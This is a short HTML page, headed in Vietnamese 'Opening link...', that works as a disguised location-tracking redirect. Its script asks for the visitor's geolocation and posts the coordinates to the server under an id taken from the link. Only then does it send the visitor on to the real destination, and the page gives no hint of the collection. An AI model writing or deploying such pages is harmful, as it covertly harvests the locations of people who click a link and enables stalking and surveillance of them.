<h3>Đang mở link...</h3>

<script>
const id = location.pathname.split("/").pop();

navigator.geolocation.getCurrentPosition(pos => {
  fetch("/location/" + id, {
    method: "POST",
    headers: {"Content-Type":"application/json"},
    body: JSON.stringify({
      lat: pos.coords.latitude,
      lng: pos.coords.longitude
    })
  }).finally(() => {
    fetch("/data/" + id)
      .then(r => r.json())
      .then(d => location.href = d.target);
  });
});
</script>
